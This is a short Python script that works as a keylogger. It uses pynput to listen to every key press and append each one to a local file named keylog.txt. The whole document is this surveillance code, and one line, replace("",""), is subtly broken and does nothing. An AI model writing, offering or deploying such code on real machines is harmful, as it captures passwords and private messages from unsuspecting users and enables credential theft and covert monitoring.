from pynput.keyboard import Listener
def keypress(key):
    key = str(key).replace("","")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.enter':
        key= '\n'

    if key == 'Key.shift_r':
        key = "SHIFT"
    with open("keylog.txt", 'a') as f:
        f.write(key)

with Listener(on_press = keypress) as I:
    I.join()
